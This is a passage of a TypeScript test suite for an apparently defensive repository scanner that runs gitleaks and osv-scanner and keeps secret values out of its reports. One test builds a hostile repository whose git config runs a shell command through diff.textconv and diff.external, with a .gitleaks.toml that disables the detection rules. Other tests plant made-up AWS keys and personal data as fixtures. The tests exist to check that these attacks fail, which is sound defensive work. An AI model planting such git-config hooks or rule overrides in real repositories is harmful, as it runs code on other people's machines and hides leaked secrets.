import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { access, readFile, stat, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { test } from "node:test";
import { promisify } from "node:util";
import { GIT_LOG_OPTIONS } from "../src/repos/gitleaks.ts";
import { coverageNotes, exceeds, exitCode, parseScanReport, renderMarkdown, renderSummary, repoName } from "../src/repos/report.ts";
import { progressLine, reposScan } from "../src/main.ts";
import { CancelledError, run as realRun, type Runner } from "../src/repos/exec.ts";
import { History } from "../src/repos/history.ts";
import { repoConcurrency, rescanRepo, scanRepos } from "../src/repos/scan.ts";
import { scannerSettingFiles } from "../src/repos/settings.ts";
import { REPORT_FORMAT, type ScanReport } from "../src/repos/types.ts";
import { presetChoices } from "../ui/scan-choices.js";
import { fakeAwsKeyId, fakeGit, fakeRunner, git, gitleaksRepo, installed, makeTree, photoWithGps, tempDir } from "./helpers.ts";

const exec = promisify(execFile);
const CLI = join(import.meta.dirname, "../bin/porchlight.js");
const NOW = () => new Date("2026-11-17T12:00:00Z");

const gitleaksRow = (file: string) => ({ RuleID: "generic-api-key", Description: "Generic API key", StartLine: 3, File: file, Commit: "abcdef1234567890" });
const osvRow = (score: string) => ({
	results: [
		{
			source: { path: "package-lock.json" },
			packages: [{ package: { name: "pkg", version: "1.0.0" }, vulnerabilities: [{ id: "GHSA-x", summary: "Bad" }], groups: [{ ids: ["GHSA-x"], max_severity: score }] }],
		},
	],
});

async function twoRepos(): Promise<string> {
	const root = await tempDir();
	await makeTree(root, { "clean/.git/": "", "leaky/.git/": "" });
	return root;
}

test("runs every installed scanner on every repository and ranks the worst first", async () => {
	const root = await twoRepos();
	const run = fakeRunner({
		gitleaks: (args) =>
			args[0] === "version"
				? { stdout: "8.30.1\n" }
				: { stdout: gitleaksRepo(args).endsWith("leaky") ? JSON.stringify([gitleaksRow("app/settings.py")]) : "[]" },
		"osv-scanner": (args) =>
			args[0] === "--version"
				? { stdout: "osv-scanner version: 2.2.1\n" }
				: args.at(-1)!.endsWith("leaky")
					? { code: 1, stdout: JSON.stringify(osvRow("9.8")) }
					: { code: 128, stderr: "No package sources found" },
	});

	const report = await scanRepos({ root, depth: 2, run, now: NOW });

	assert.deepEqual(
		report.tools.map((tool) => `${tool.tool} ${tool.status} ${tool.version}`),
		["gitleaks ok 8.30.1", "osv-scanner ok 2.2.1"],
	);
	assert.deepEqual(report.repos.map((repo) => [repo.path, repo.findings.length, repo.errors.length]), [
		[join(root, "clean"), 0, 0],
		[join(root, "leaky"), 2, 0],
	]);
	assert.deepEqual(coverageNotes(report), []);
	assert.equal(exceeds(report, "critical"), true);

	const markdown = renderMarkdown(report);
	// The secret is a generic pattern match in ordinary source, so triage ranks it medium.
	assert.match(markdown, /Scanned 2 repositories .* on 2026-11-17: 2 findings \(1 critical, 0 high, 1 medium, 0 low\)\./);
	assert.ok(markdown.indexOf("| leaky | 1 | 0 | 1 | 0 |") < markdown.indexOf("| clean | 0 | 0 | 0 | 0 |"));
	assert.ok(
		markdown.indexOf("**critical** vulnerability `GHSA-x`") < markdown.indexOf("**medium** secret `generic-api-key`"),
		"findings are listed most severe first",
	);
	assert.ok(!markdown.includes("## clean"), "clean repositories get no findings section");
});

test("a scanner that is not installed is reported as a gap, not as a clean result", async () => {
	const root = await twoRepos();
	const run = fakeRunner({
		gitleaks: (args) => ({ stdout: args[0] === "version" ? "8.30.1" : "[]" }),
		"osv-scanner": "missing",
	});

	const report = await scanRepos({ root, depth: 2, run, now: NOW });

	assert.deepEqual(coverageNotes(report), [
		"Dependencies were not checked: osv-scanner is not installed (brew install osv-scanner).",
	]);
	assert.ok(renderMarkdown(report).includes("## Not covered"));
	assert.ok(renderSummary(report).includes("Not covered: Dependencies were not checked"));
	assert.ok(
		run.calls.every((call) => call[0] !== "osv-scanner" || call[1] === "--version"),
		"a missing scanner is not invoked per repository",
	);
	assert.equal(exceeds(report, "low"), false);
});

test("a scanner failing on one repository is recorded and the rest still run", async () => {
	const root = await twoRepos();
	const run = fakeRunner({
		gitleaks: (args) => {
			if (args[0] === "version") return { stdout: "8.30.1" };
			return gitleaksRepo(args).endsWith("clean") ? { code: 1, stderr: "fatal: bad object HEAD\nmore detail" } : { stdout: "[]" };
		},
		"osv-scanner": (args) => (args[0] === "--version" ? { stdout: "2.2.1" } : { code: 1, stdout: JSON.stringify(osvRow("5.0")) }),
	});

	const report = await scanRepos({ root, depth: 2, run, now: NOW });

	assert.deepEqual(report.repos[0]!.errors, [{ tool: "gitleaks", message: "fatal: bad object HEAD" }]);
	assert.equal(report.repos[0]!.findings.length, 1, "osv-scanner still ran on the repository gitleaks failed on");
	assert.deepEqual(coverageNotes(report), ["gitleaks failed on clean: fatal: bad object HEAD"]);
});

test("gitleaks reporting nothing because git could not read the history is a failure, not a clean result", async () => {
	const root = await twoRepos();
	const run = fakeRunner({
		gitleaks: (args) =>
			args[0] === "version"
				? { stdout: "8.30.1" }
				: {
						code: 0,
						stdout: "[]",
						stderr: `8:51PM ERR [git] fatal: detected dubious ownership in repository at '/x'\n8:51PM ERR error="stderr is not empty"\n`,
					},
		"osv-scanner": "missing",
	});

	const report = await scanRepos({ root, depth: 2, run, now: NOW });

	assert.deepEqual(report.repos[0]!.errors, [{ tool: "gitleaks", message: "[git] fatal: detected dubious ownership in repository at '/x'" }]);
	assert.equal(exitCode(report, "critical"), 1, "a gate cannot pass on a history that was never read");
});

test("gitleaks uses Porchlight's rules, reads a copy of the history, and stops git running the repository's diff programs", async () => {
	const root = await twoRepos();
	const run = fakeRunner({ gitleaks: (args) => ({ stdout: args[0] === "version" ? "8.30.1" : "[]" }), "osv-scanner": "missing" });

	await scanRepos({ root, depth: 2, run, now: NOW });

	const at = run.calls.findIndex((call) => call[0] === "gitleaks" && call[1] === "git");
	const scan = run.calls[at]!;
	const repo = scan[scan.indexOf("--gitleaks-ignore-path") + 1]!;
	assert.ok(repo.startsWith(root), "ignore files come from the repository, not the working folder");
	assert.match(scan.at(-1)!, /porchlight-copy-/, "history is read from Porchlight's own copy, never the repository in place");
	const config = scan[scan.indexOf("--config") + 1]!;
	assert.ok(!config.startsWith(root), "the config is Porchlight's own");
	const rules = await readFile(config, "utf8");
	const globalPaths = /^\[\[allowlists\]\]\ndescription = "global allow lists"\npaths = \[\n([^\]]*)\]/m.exec(rules)?.[1];
	assert.equal(globalPaths?.trim(), String.raw`'''(?:^|/)\.git$''',`, "no file is skipped by its name but .git");
	assert.ok(scan.includes(`--log-opts=${GIT_LOG_OPTIONS}`));
	for (const option of ["--no-textconv", "--no-ext-diff", "--all", "--text", "--encoding=none", "--diff-merges=first-parent"]) assert.ok(GIT_LOG_OPTIONS.split(" ").includes(option), option);
	assert.ok(scan.includes("--redact") && scan.includes("--ignore-gitleaks-allow"));
	const env = run.envs[at]!;
	for (const [name, value] of Object.entries({ GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: "/dev/null", GIT_NO_LAZY_FETCH: "1", GIT_NO_REPLACE_OBJECTS: "1" })) assert.equal(env[name], value, name);
});

test("lists the files that tell a scanner to leave findings out, without reading dependencies or .git", async () => {
	const repo = await tempDir();
	await makeTree(repo, {
		".gitleaksignore": "abc:config.ini:generic-api-key:1\n",
		".gitleaks.toml": "[extend]\nuseDefault = false\n",
		"web/osv-scanner.toml": "",
		"web/node_modules/dep/osv-scanner.toml": "",
		".git/osv-scanner.toml": "",
		"api/README.md": "",
	});

	assert.deepEqual((await scannerSettingFiles(repo)).sort(), [".gitleaks.toml", ".gitleaksignore", "web/osv-scanner.toml"]);
	assert.deepEqual(await scannerSettingFiles(join(repo, "api")), []);
});

test("an unreachable vulnerability database is a failure, not a clean result", async () => {
	const root = await twoRepos();
	// What osv-scanner really does offline: exit 127, yet a well-formed empty report on stdout.
	const offline = {
		code: 127,
		stdout: '{"results": [], "experimental_config": {}}',
		stderr:
			"Scanning dir /work/clean\nScanned /work/clean/package-lock.json file and found 2 packages\n" +
			'Error during extraction: max retries exceeded: request failed: Post "https://api.osv.dev/v1/querybatch": timeout\n',
	};
	const run = fakeRunner({
		gitleaks: (args) => ({ stdout: args[0] === "version" ? "8.30.1" : "[]" }),
		"osv-scanner": (args) => (args[0] === "--version" ? { stdout: "osv-scanner version: 2.7.1\nosv-scalibr version: 0.5.3" } : offline),
	});

	const report = await scanRepos({ root, depth: 2, run, now: NOW });

	assert.equal(report.tools[1]!.version, "2.7.1");
	assert.deepEqual(report.repos.map((repo) => repo.findings.length), [0, 0]);
	assert.equal(report.repos[0]!.errors[0]!.tool, "osv-scanner");
	assert.match(report.repos[0]!.errors[0]!.message, /^Error during extraction: .*api\.osv\.dev/);
	assert.equal(coverageNotes(report).length, 2, "both repositories are reported as not covered");
	assert.ok(renderMarkdown(report).includes("## Not covered"));
	assert.equal(exitCode(report, "critical"), 1, "a gate cannot pass on a scan that did not run");
	assert.equal(exitCode(report, undefined), 0);
});

test("the report states why a secret was ranked lower", async () => {
	const root = await twoRepos();
	const run = fakeRunner({
		gitleaks: (args) =>
			args[0] === "version"
				? { stdout: "8.30.1" }
				: { stdout: gitleaksRepo(args).endsWith("leaky") ? JSON.stringify([gitleaksRow("tests/test_settings.py"), gitleaksRow("app/settings.py")]) : "[]" },
		"osv-scanner": (args) => (args[0] === "--version" ? { stdout: "2.7.1" } : { code: 128 }),
	});

	const markdown = renderMarkdown(await scanRepos({ root, depth: 2, run, now: NOW }));

	assert.match(markdown, /\| leaky \| 0 \| 0 \| 1 \| 1 \|/);
	assert.ok(
		markdown.includes("- **medium** secret `generic-api-key` in `app/settings.py:3` (commit abcdef12): Generic API key. Ranked lower: generic pattern, not a known key format"),
	);
	assert.ok(
		markdown.includes("- **low** secret `generic-api-key` in `tests/test_settings.py:3` (commit abcdef12): Generic API key. Ranked lower: generic pattern, not a known key format; in a test path"),
	);
});

test("--fail-on thresholds", () => {
	const report: ScanReport = {
		root: "/work",
		scannedAt: NOW().toISOString(),
		tools: [],
		repos: [{ path: "/work/a", errors: [], findings: [{ tool: "osv-scanner", kind: "vulnerability", severity: "medium", ruleId: "X", title: "t", location: "l", detail: "d" }] }],
	};
	assert.deepEqual(
		(["critical", "high", "medium", "low"] as const).map((threshold) => exceeds(report, threshold)),
		[false, false, true, true],
	);
	assert.deepEqual(
		([undefined, "critical", "medium"] as const).map((threshold) => exitCode(report, threshold)),
		[0, 0, 2],
	);
	// Findings outrank an incomplete scan: 2 says "act on this", 1 says "this could not be trusted".
	const missingTool = { ...report, tools: [{ tool: "gitleaks" as const, status: "missing" as const, installHint: "brew install gitleaks" }] };
	assert.deepEqual([exitCode(missingTool, "critical"), exitCode(missingTool, "medium")], [1, 2]);
});

test("end to end: a hostile repository can neither run a program nor switch gitleaks' rules off", async (t) => {
	if (!(await installed("gitleaks"))) return t.skip("gitleaks is not installed");
	const root = await tempDir();
	const repo = join(root, "hostile");
	const marker = join(root, "ran");
	const program = `sh -c 'touch "${marker}"; cat "$0"'`;
	await makeTree(repo, {
		"config.txt": `aws_access_key_id = ${fakeAwsKeyId()}\n`,
		".gitattributes": "*.txt diff=hostile\n",
		// Turns every built-in rule off and adds one that never matches.
		".gitleaks.toml": `[extend]\nuseDefault = false\n\n[[rules]]\nid = "nothing"\nregex = "zq{40}"\n`,
	});
	await git(repo, "init", "-q");
	await git(repo, "config", "diff.hostile.textconv", program);
	await git(repo, "config", "diff.external", program);
	await git(repo, "add", "-A");
	await git(repo, "commit", "-q", "-m", "one");
	await writeFile(join(repo, "config.txt"), "changed\n");
	await git(repo, "commit", "-q", "-am", "two");

	const report = await scanRepos({ root, depth: 1, now: NOW });

	await assert.rejects(access(marker), "no program from the repository's .git/config ran");
	const scanned = report.repos[0]!;
	assert.deepEqual(
		scanned.errors.filter((error) => error.tool === "gitleaks"),
		[],
	);
	assert.ok(
		scanned.findings.some((finding) => finding.ruleId === "aws-access-token"),
		"the built-in rules ran although the repository's .gitleaks.toml turns them off",
	);
	assert.deepEqual(scanned.settingFiles, [".gitleaks.toml"]);
});

test("end to end: the real gitleaks finds a secret in history and the report never contains it", async (t) => {
	if (!(await installed("gitleaks"))) return t.skip("gitleaks is not installed");
	const root = await tempDir();
	const key = fakeAwsKeyId();
	await makeTree(root, { "service/config.ini": `aws_access_key_id = ${key}\n`, "service/README.md": "demo\n", "docs/README.md": "docs\n" });
	for (const repo of ["service", "docs"]) {
		await git(join(root, repo), "init", "-q");
		await git(join(root, repo), "add", "-A");
		await git(join(root, repo), "commit", "-q", "-m", "initial");
	}
	// Deleting the file does not remove the secret from history.
	await git(join(root, "service"), "rm", "-q", "config.ini");
	await git(join(root, "service"), "commit", "-q", "-m", "remove config");
	const out = join(root, "report.md");

	const result = await exec(process.execPath, [CLI, "repos", "scan", root, "--out", out, "--fail-on", "high"]).catch(
		(err: { code: number; stdout: string; stderr: string }) => err,
	);

	assert.equal((result as { code?: number }).code, 2, "exit code 2 signals findings at or above the threshold");
	const report = await readFile(out, "utf8");
	assert.match(report, /\| service \| 0 \| 1 \| 0 \| 0 \|/);
	assert.match(report, /\| docs \| 0 \| 0 \| 0 \| 0 \|/);
	assert.match(report, /\*\*high\*\* secret `aws-access-token` in `config\.ini:1` \(commit [0-9a-f]{8} on \d{4}-\d\d-\d\d\)/);
	for (const text of [report, result.stdout, result.stderr]) {
		assert.ok(!text.includes(key), "the secret value must not appear in any output");
	}
});

test("scans a further folder in the same report and names its repositories apart", async () => {
	const dir = await tempDir();
	await makeTree(dir, { "projects/shop/.git/HEAD": "ref", "data/github/me/shop/.git/HEAD": "ref", "data/github/me/too/deep/nested/.git/HEAD": "ref" });
	const root = join(dir, "projects");
	const github = join(dir, "data", "github");

	const report = await scanRepos({ root, depth: 3, also: [{ root: github, depth: 2 }, { root, depth: 3 }], run: fakeRunner({}), settingFiles: async () => [] });

	// Found once each, the second folder only to its own depth.
	assert.deepEqual(report.repos.map((repo) => repo.path), [join(github, "me", "shop"), join(root, "shop")]);
	assert.deepEqual(report.otherRoots, [github, root]);
	// Two repositories called "shop" stay two names.
	assert.deepEqual(report.repos.map((repo) => repoName({ ...report, otherRoots: [github] }, repo)), ["github/me/shop", "shop"]);
	// A report from before this existed is named as it always was.
	assert.equal((await scanRepos({ root, depth: 3, run: fakeRunner({}), settingFiles: async () => [] })).otherRoots, undefined);
});

test("runs a repository's scanners together, and still reports them in one order", async () => {
	const root = await tempDir();
	await makeTree(root, { "leaky/.git/": "" });
	let running = 0;
	let together = 0;
	const slow = async <T>(value: T, ms: number): Promise<T> => {
		running++;
		together = Math.max(together, running);
		await new Promise((done) => setTimeout(done, ms));
		running--;
		return value;
	};
	const run: Runner = async (command, args) => {
		if (args[0] === "version" || args[0] === "--version") return { code: 0, stdout: "1.0.0\n", stderr: "" };
		if (command === "git") return { code: 0, stdout: "", stderr: "", ...fakeGit(args) };
		// gitleaks answers last, and is still listed first.
		if (command === "gitleaks") return slow({ code: 0, stdout: JSON.stringify([gitleaksRow("app/settings.py")]), stderr: "" }, 40);
		return slow({ code: 1, stdout: JSON.stringify(osvRow("9.8")), stderr: "" }, 5);
	};

	const report = await scanRepos({ root, depth: 2, run, now: NOW });

	assert.equal(together, 2, "both scanners were running at once");
	assert.deepEqual(report.repos[0]!.findings.map((finding) => finding.tool), ["gitleaks", "osv-scanner"]);
});

test("says when each repository finishes, how long it took and what it found", async () => {
	const root = await twoRepos();
	const run = fakeRunner({
		gitleaks: (args) => (args[0] === "version" ? { stdout: "8.30.1\n" } : gitleaksRepo(args).endsWith("leaky") ? { stdout: JSON.stringify([gitleaksRow("a.py")]) } : { stdout: "[]" }),
		"osv-scanner": (args) => (args[0] === "--version" ? { stdout: "2.7.1\n" } : { code: 127, stderr: "could not reach the database" }),
	});
	let clock = Date.parse("2026-11-17T12:00:00Z");
	const lines: string[] = [];

	await scanRepos({ root, depth: 2, run, concurrency: 1, now: () => new Date((clock += 700)), onRepoDone: (done) => lines.push(progressLine(done, root)) });

	assert.deepEqual(lines, ["[1/2] clean  0.7s  0 findings, 1 scanner failed", "[2/2] leaky  0.7s  1 finding, 1 scanner failed"]);
	assert.equal(progressLine({ done: 3, total: 17, path: join(root, "group/shop"), ms: 12_400, findings: 4, errors: 0 }, root), "[ 3/17] group/shop  12s  4 findings");
	assert.deepEqual([1, 4, 8, 16, 64].map(repoConcurrency), [2, 2, 4, 8, 8]);
});

test("a cancelled scan stops its scanners and reports nothing", async () => {
	const root = await twoRepos();
	const cancel = new AbortController();
	const signals: (AbortSignal | undefined)[] = [];
	const run: Runner = async (_command, args, options) => {
		if (args[0] === "version" || args[0] === "--version") return { code: 0, stdout: "1.0.0\n", stderr: "" };
		signals.push(options?.signal);
		// The owner cancels while the first scanners are at work; a real program is stopped by the signal.
		cancel.abort();
		throw new CancelledError();
	};

	await assert.rejects(scanRepos({ root, depth: 2, run, concurrency: 1, signal: cancel.signal }), CancelledError);
	assert.ok(signals.length > 0 && signals.every((signal) => signal === cancel.signal), "every scanner was given the signal");
	// The real runner refuses to start anything once cancelled.
	await assert.rejects(realRun("git", ["--version"], { signal: cancel.signal }), CancelledError);
});

test("scans one repository again without touching the others", async () => {
	const root = await twoRepos();
	const scanned: string[] = [];
	const run = fakeRunner({
		gitleaks: (args) => (args[0] === "version" ? { stdout: "8.30.1\n" } : (scanned.push(gitleaksRepo(args)), { stdout: "[]" })),
		"osv-scanner": (args) => (args[0] === "--version" ? { stdout: "2.7.1\n" } : { code: 128, stderr: "No package sources found" }),
	});

	const { repo, tools } = await rescanRepo(join(root, "leaky"), { run });

	assert.deepEqual(scanned, [join(root, "leaky")]);
	assert.deepEqual([repo.path, repo.findings, repo.errors], [join(root, "leaky"), [], []]);
	assert.deepEqual(tools.map((tool) => `${tool.tool} ${tool.status}`), ["gitleaks ok", "osv-scanner ok"]);
});

test("--save keeps a terminal scan where the interface reads it, readable only by its owner", async () => {
	const root = await twoRepos();
	const dataDir = await tempDir();
	const run = fakeRunner({
		gitleaks: (args) => (args[0] === "version" ? { stdout: "8.30.1\n" } : { stdout: "[]" }),
		"osv-scanner": (args) => (args[0] === "--version" ? { stdout: "2.7.1\n" } : { code: 128, stderr: "No package sources found" }),
	});
	const out = join(await tempDir(), "report.md");

	assert.equal(await reposScan([root, "--out", out], { run, dataDir }), 0);
	await assert.rejects(access(join(dataDir, "repo-scan.json")), "nothing is kept without --save");

	assert.equal(await reposScan([root, "--out", out, "--save"], { run, dataDir }), 0);
	const saved = JSON.parse(await readFile(join(dataDir, "repo-scan.json"), "utf8")) as ScanReport;
	assert.deepEqual([saved.root, saved.repos.length], [root, 2]);
	assert.equal((await stat(join(dataDir, "repo-scan.json"))).mode & 0o777, 0o600);
	assert.deepEqual((await new History(dataDir).list()).map((entry) => entry.scannedAt), [saved.scannedAt]);
});

test("with an OSV database folder, packages are compared against it and not looked up one by one", async () => {
	const root = await twoRepos();
	const database = join(await tempDir(), "osv-db");
	const run = fakeRunner({
		gitleaks: (args) => (args[0] === "version" ? { stdout: "8.30.1\n" } : { stdout: "[]" }),
		"osv-scanner": (args) => (args[0] === "--version" ? { stdout: "2.7.1\n" } : { code: 128, stderr: "No package sources found" }),
	});

	await scanRepos({ root, depth: 2, run, osvDatabase: database });
	const osvCalls = run.calls.map((call, index) => ({ call, env: run.envs[index] })).filter(({ call }) => call[0] === "osv-scanner" && call[1] === "scan");
	assert.equal(osvCalls.length, 2);
	for (const { call, env } of osvCalls) {
		assert.ok(call.includes("--offline-vulnerabilities"), call.join(" "));
		assert.deepEqual(env, { OSV_SCANNER_LOCAL_DB_CACHE_DIRECTORY: database });
	}
	// The databases are brought up to date by one run, not by every repository at once (OP-4).
	assert.equal(osvCalls.filter(({ call }) => call.includes("--download-offline-databases")).length, 1);

	// Without one, nothing changes.
	const online = fakeRunner({
		gitleaks: (args) => (args[0] === "version" ? { stdout: "8.30.1\n" } : { stdout: "[]" }),
		"osv-scanner": (args) => (args[0] === "--version" ? { stdout: "2.7.1\n" } : { code: 128, stderr: "No package sources found" }),
	});
	await scanRepos({ root, depth: 2, run: online });
	assert.ok(online.calls.filter((call) => call[0] === "osv-scanner").every((call) => !call.includes("--offline-vulnerabilities")));
});

test("end to end: a Quick scan reads the files as they are now, says history was not read, and keeps every value out", async (t) => {
	if (!(await installed("gitleaks"))) return t.skip("gitleaks is not installed");
	const root = await tempDir();
	const repo = join(root, "app");
	// Four made-up keys: one deleted (in history only), one still in a file, one typed in since the
	// last commit, and one in an ignored .env.
	const [removed, kept, typed, local] = ["Q3EGTZNXPL7VWK4D", "W5HJ2LMBQRS6TUV7", "D4FG3HJKLM2NP6QR", "X7YZ2ABCDE3FG4HI"].map((tail) => ["AKIA", tail].join(""));
	await makeTree(repo, { "old.ini": `aws_access_key_id = ${removed}\n`, "kept.ini": `aws_access_key_id = ${kept}\n`, "edit.ini": "hello\n", ".gitignore": ".env\n" });
	await git(repo, "init", "-q");
	await git(repo, "add", "-A");
	await git(repo, "commit", "-q", "-m", "one");
	await git(repo, "rm", "-q", "old.ini");
	await git(repo, "commit", "-q", "-m", "two");
	await writeFile(join(repo, "edit.ini"), `aws_access_key_id = ${typed}\n`);
	await writeFile(join(repo, ".env"), `AWS_ACCESS_KEY_ID=${local}\n`);
	const secrets = (report: ScanReport) => report.repos[0]!.findings.filter((finding) => finding.kind === "secret").map((finding) => `${finding.location} ${finding.severity} (${finding.detail})`).sort();

	const quick = await scanRepos({ root, depth: 1, now: NOW, choices: presetChoices("quick") });
	// The key typed since the last commit is not in the committed edit.ini: it has not left this computer.
	assert.deepEqual(secrets(quick), ["edit.ini:1 medium (on this computer only, an uncommitted change)", "kept.ini:1 high (current files)"]);
	assert.ok(coverageNotes(quick).some((note) => note.startsWith("Git history was not read for secrets")), "a Quick scan says history was not covered");
	assert.equal(quick.choices?.preset, "quick");

	const everything = await scanRepos({ root, depth: 1, now: NOW, choices: { ...presetChoices("standard"), localFiles: true } });
	assert.deepEqual(secrets(everything).map((line) => line.replace(/commit [0-9a-f]{8} on [\d-]+/, "commit")), [
		".env:1 medium (on this computer only, not in git)",
		"edit.ini:1 medium (on this computer only, an uncommitted change)",
		"kept.ini:1 high (commit)",
		"old.ini:1 high (commit)",
	]);
	assert.deepEqual(coverageNotes(everything), []);

	// The last commit only deleted a file: what it removed is not a secret it added.
	const recent = await scanRepos({ root, depth: 1, now: NOW, choices: { ...presetChoices("standard"), history: 1 } });
	assert.deepEqual(secrets(recent), ["edit.ini:1 medium (on this computer only, an uncommitted change)", "kept.ini:1 high (current files)"]);
	assert.ok(coverageNotes(recent).some((note) => note.startsWith("Only the last commit and the files as they are now were read")));

	// A file changed since it was committed, with a committed key still in it: that key is a committed one.
	await writeFile(join(repo, "kept.ini"), `# edited\naws_access_key_id = ${kept}\n`);
	assert.deepEqual(secrets(await scanRepos({ root, depth: 1, now: NOW, choices: presetChoices("quick") })), [
		"edit.ini:1 medium (on this computer only, an uncommitted change)",
		"kept.ini:2 high (current files, changed since the last commit)",
	]);

	const skipped = await scanRepos({ root, depth: 1, now: NOW, choices: { ...presetChoices("quick"), skip: ["app"] } });
	assert.deepEqual([skipped.repos.length, skipped.skipped], [0, ["app"]]);

	for (const report of [quick, everything, recent]) {
		const text = JSON.stringify(report);
		for (const key of [removed, kept, typed, local]) assert.ok(!text.includes(key!), "no key value is in the report");
	}
});

test("a check switched off runs no scanner, and a Quick scan never runs git's own programs", async () => {
	const root = await tempDir();
	await makeTree(root, { "app/.git/": "" });
	const run = fakeRunner({
		gitleaks: (args) => ({ stdout: args[0] === "version" ? "8.30.1" : "[]" }),
		"osv-scanner": (args) => ({ stdout: args[0] === "--version" ? "2.7.1" : "{}" }),
		git: () => ({ stdout: "" }),
	});
	const report = await scanRepos({ root, depth: 1, run, settingFiles: async () => [], choices: { ...presetChoices("quick"), dependencies: false } });
	const scans = run.calls.filter((call) => !["version", "--version"].includes(call[1]!));
	// gitleaks reads the copied files; git is asked only for its index and HEAD's tree, with nothing a repository sets able to run.
	assert.deepEqual(scans.map((call) => call[0]), ["git", "git", "gitleaks"]);
	for (const gitCall of scans.slice(0, 2)) assert.ok(gitCall.includes("core.fsmonitor=false") && gitCall.includes("core.hooksPath=/dev/null"));
	assert.deepEqual(scans[0]!.slice(-3), ["ls-files", "--stage", "-z"]);
	assert.deepEqual(scans[1]!.slice(-5), ["ls-tree", "-r", "-z", "--full-tree", "HEAD"]);
	assert.deepEqual(scans[2]!.slice(0, 2), ["gitleaks", "dir"]);
	assert.ok(scans[2]!.includes("--redact"));
	assert.equal(report.repos[0]!.errors.length, 0);
	assert.deepEqual(report.choices?.dependencies, false);
});

test("end to end: private data of every kind is found in history and in the files as they are now, and no value reaches the report", async (t) => {
	if (!(await installed("gitleaks"))) return t.skip("gitleaks is not installed");
	const root = await tempDir();
	const repo = join(root, "people");
	const j = (...parts: string[]) => parts.join("");
	// Made-up values, assembled here so this repository's own scan has nothing to find.
	const values = {
		ssn: j("536-", "22-", "4471"),
		card: j("4539 1488 ", "0343 6467"),
		iban: j("DE44 5001 0517 ", "5407 3249 31"),
		gps: j("51.50735", ", -0.12776"),
		host: j("db1.prod", ".internal"),
	};
	const addresses = Array.from({ length: 25 }, (_, i) => j(`person${i}.surname`, "@", "mailbox.org"));
	const kinds = (dir: string, image: string, document: string) => ({
		[`${dir}/contacts.csv`]: `email\n${addresses.join("\n")}\n`,
		[`${dir}/ids.txt`]: `ssn ${values.ssn}\ncard ${values.card}\niban ${values.iban}\n`,
		[`${dir}/home.txt`]: `home: ${values.gps}\n`,
		[`${dir}/hosts.txt`]: `gateway 192.168.4.1\ndatabase ${values.host}\n`,
		[`${dir}/users.sqlite`]: "SQLite format 3\0",
		[`${dir}/${document}`]: "%PDF-1.4\n",
		[`${dir}/${image}`]: "",
	});
	const old = kinds("old", "photo.jpg", "passport.pdf");
	const now = kinds("now", "garden.jpg", "bank-statement.pdf");
	await makeTree(repo, { ...old, ...now, "tests/fixtures/users.json": JSON.stringify([j("alice", "@", "example.com")]) });
	await writeFile(join(repo, "old/photo.jpg"), photoWithGps([51, 30, 2645], [0, 7, 3982]));
	await writeFile(join(repo, "now/garden.jpg"), photoWithGps([48, 51, 1200], [2, 21, 800]));
	await git(repo, "init", "-q");
	await git(repo, "add", "-A");
	await git(repo, "commit", "-q", "-m", "data");
	// Deleting the files does not take them out of history.
	await git(repo, "rm", "-q", "-r", "old");
	await git(repo, "commit", "-q", "-m", "remove");

	const RULES = ["private-data-dump", "private-dump-file", "private-gps", "private-iban", "private-internal-name", "private-ip", "private-payment-card", "private-photo-location", "private-us-ssn", "private-document"].sort();
	const rulesIn = (report: ScanReport, dir: string) => [...new Set(report.repos[0]!.findings.filter((finding) => finding.kind === "private-data" && finding.location.startsWith(`${dir}/`)).map((finding) => finding.ruleId))].sort();

	const deep = await scanRepos({ root, depth: 1, now: NOW, choices: { ...presetChoices("deep"), analyse: false } });
	assert.deepEqual(deep.repos[0]!.errors, []);
	assert.deepEqual(rulesIn(deep, "old"), RULES, "everything in the deleted files is still found in history");
	assert.deepEqual(rulesIn(deep, "now"), RULES);
	const dump = deep.repos[0]!.findings.find((finding) => finding.ruleId === "private-data-dump" && finding.location.startsWith("now/"))!;
	assert.deepEqual([dump.title, dump.severity, dump.count, dump.detail.startsWith("commit ")], ["Possible data dump: 25 email addresses in one file", "high", 25, true]);
	// Example data ranks below real-looking data.
	const example = deep.repos[0]!.findings.find((finding) => finding.ruleId === "private-email-example")!;
	assert.deepEqual([example.severity, example.location], ["low", "tests/fixtures/users.json:1"]);
	assert.ok(deep.repos[0]!.findings.some((finding) => finding.kind === "secret") === false, "no secret in this repository");

	// Quick reads the files as they are now: the deleted ones are not looked for, and the report says so.
	const quick = await scanRepos({ root, depth: 1, now: NOW, choices: { ...presetChoices("quick"), privateData: true } });
	assert.deepEqual(rulesIn(quick, "now"), RULES);
	assert.deepEqual(rulesIn(quick, "old"), []);
	assert.ok(quick.repos[0]!.findings.filter((finding) => finding.kind === "private-data" && finding.location.startsWith("now/")).every((finding) => finding.detail === "current files"));
	assert.ok(coverageNotes(quick).some((note) => note.startsWith("Git history was not read for secrets or private data")));

	for (const report of [deep, quick]) {
		const text = JSON.stringify(report);
		for (const value of [...Object.values(values), ...addresses]) assert.ok(!text.includes(value), "no value is in the report");
		assert.ok(!text.includes("mailbox.org"));
	}
});

test("a report says its format, and one newer than this version reads is refused, never read as complete (B26)", async () => {
	const root = await twoRepos();
	const run = fakeRunner({ gitleaks: (args) => ({ stdout: args[0] === "version" ? "8.30.1" : "[]" }), "osv-scanner": "missing" });
	const report = await scanRepos({ root, depth: 2, run, now: NOW });
	assert.equal(report.format, REPORT_FORMAT);
	assert.equal(parseScanReport(JSON.stringify(report), "r.json").format, REPORT_FORMAT);
	assert.equal(parseScanReport(JSON.stringify({ ...report, format: undefined }), "old.json").root, root, "a report from before formats is still read");
	assert.throws(() => parseScanReport(JSON.stringify({ ...report, format: REPORT_FORMAT + 1 }), "new.json"), /newer Porchlight.*Update Porchlight/);
});

test("repositories fetched from GitHub are scanned exactly as listed, whatever they are named; a passed-over folder is said (S50, S59)", async () => {
	const root = await tempDir();
	const fetched = await tempDir();
	await makeTree(root, { "app/.git/": "", ".dotfiles/.git/": "" });
	await makeTree(fetched, { "me/.dotfiles/.git/": "", "me/vendor/.git/": "" });
	const run = fakeRunner({ gitleaks: (args) => ({ stdout: args[0] === "version" ? "8.30.1" : "[]" }), "osv-scanner": "missing" });
	const report = await scanRepos({ root, depth: 2, run, now: NOW, also: [{ root: fetched, repos: [join(fetched, "me/.dotfiles"), join(fetched, "me/vendor")] }] });
	assert.deepEqual(
		report.repos.map((repo) => repoName(report, repo)).sort(),
